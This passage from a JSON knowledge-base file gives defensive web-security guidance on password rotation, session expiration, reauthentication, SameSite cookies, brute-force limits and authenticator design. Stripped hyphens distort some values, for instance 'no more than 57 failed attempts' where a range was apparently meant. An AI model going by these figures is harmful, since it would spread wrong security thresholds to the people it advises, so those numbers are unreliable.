password composition rules limiting the type of characters permitted. \n\tThere should be no requirement for upper or lower case or numbers or special characters.\n"}, {"kb_id": 6915, "title": "No Credential Rotation Requirements", "content": " Description:\n\n\tDo not require that memorized secrets be changed arbitrarily (e.g., periodically)\n\tunless there is a user request or evidence of authenticator compromise. \n\tPassword expiration policies do more harm than good, because these policies drive users to very\n\tpredictable passwords composed of sequential words and numbers which are closely related to each\n\tother (that is, the next password can be predicted based on the previous password). Password change\n\toffers no containment benefits cyber criminals almost always use credentials as soon as they\n\tcompromise them.\n\tMandated password changes are a longstanding security practice, but current research strongly\n\tindicates that password expiration has a negative effect. \n\n Solution:\n\t\n\tVerify that there are no arbitrary or periodic credential rotation requirements.\n"}, {"kb_id": 7000, "title": "Logout session expiration", "content": " Description:\n\nOnce the user hits the logout button or is logged out by inacitivity, it''s expected the application terminates user''s session and expires session identifiers properly. However, there are situations in which the application simply redirects the user to the logon page. Also, the modern applications relies on client side storage, as cache files, browser session storage, cookies as IndexedDB which may contain session related and sensitive information. Yet, complex applications relying on singlesignon(SSO) mechanisms may leave the source application sesssion as open. In the described scenarios, one attacker accessing a shared computer or using an unattended computer can resume the session and operate the application on the user''s behalf.\n\n\n Solution:\n\nVerify that absolute and timeout logout invalidates or erases any client or serverside session storage, such that the back button or a downstream relying party does not resume an authenticated session, including across relying parties. Also, verify that session identifiers are expired and can''t be reused.\n"}, {"kb_id": 7001, "title": "Reauthentication valid sessions", "content": " Description:\n\nIf the application allows the user to remain authenticated for a long period of time, for example \"Stay logged in\" functionality, which prolongs user session longer than the regular serverside timeouts, it increases the chance of an attacker to replay a valid session after successfully compromising the session. \n\n\n Solution:\n\nImplement periodical reauthentication both when actively used or after an idle period, making sure the session identifiers are also renewed.\nLevel 1  30 days\nLevel 2  12 hours or 30 minutes of inactivity, 2FA optional\nLevel 3  12 hours or 15 minutes of inactivity, with 2FA\n"}, {"kb_id": 7002, "title": "Change password session expiration", "content": " Description:\n\nIn case the user session is not terminated after a major user profile modification such as a role modification or password change, the user session and profile won''t be in the most updated state. If the user password is compromised, an attacker will be able to operate the application on behalf of the user while the session remains valid, even after the password is changed.\n\n\n Solution:\n\nAfter a successful password change process, terminate all other active sessions, and this is effective across the application, federated login (if present) and any relying parties.\n"}, {"kb_id": 7003, "title": "Samesite cookie attribute", "content": " Description:\n\nThe ''SameSite'' cookie attribute helps developers to control if a cookie can be sent along in requests initiated by thirdparty sites or crosssite requests, helping to prevent CrossSiteRequestForgery(CSRF) type of attacks.\nThe attribute accepts 2 values: strict and lax.\n strict: The cookie will NOT be transmitted within requests initiated by thirdparty sites, even if initiated by a GET request.\n lax: The cookie will be sent along with GET request only if a Top Level Navigation occurs.\n\n\n Solution:\n\nWhen creating a new cookie in browser, add the ''SameSite'' attribute.\n"}, {"kb_id": 8000, "title": "Weak revocability of physical authenticators", "content": " Description:\n\nThe physical authenticators are very powerful and have some advantages, still they must be considered as compromised, if they were stolen or disappeared. In this case the user (owner of the physical token) needs to get these tokens revoked. \nIf the revocation process it not effective, then the attacker could use it on behalf of the owner and could get access to their resources.\n\n Solution:\n\nEnsure that revocation is immediately effective across all Identity Providers and Relying Parties.\n"}, {"kb_id": 8001, "title": "Lack of Bruteforce Protection", "content": " Description:\n\nEvery password is hackable. Even the stronger ones, as well. The technique name is bruteforce. In case the attacker can do several of thousand login attempts to find out the proper password, then just matter of time and he/she will be successful.\n\n Solution:\n\nIt is recommended to employ different level of controls, like: rate limiting, CAPTCHA, increasing delays, IP address restrictions, locking accounts, riskbased restrictions. Verify that no more than 57 failed attempts is possible on a single account.\n"}, {"kb_id": 8003, "title": "Improper Two Factor Authenticators design", "content": " Description:\n\nIn case of web applications using only biometric authenticators, or using them at first place is not a security best practice.\nAsking and validating a data (like passwords) needs to be the first layer of the authentication part, and then the second place the biometric authenticators can be employed.  \n\n Solution:\n\nVerify that biometric authenticators are limited to use only as secondary factors in conjunction with either something the user has and something the user knows.\n"}, {"kb_id": 8004, "title": "Impersonation resistance not sufficent", "content": " Description:\n\nIf the web application has no proper impersonation resistance against phishing attacks then the users could be an easy target for attackers.\n\n Solution:\n\nIt is recommended to employ one (or more) of the followings: multifactor authentication, cryptographic devices with intent (such as connected keys with a push to authenticate), or clientside certificates.\n"}]}
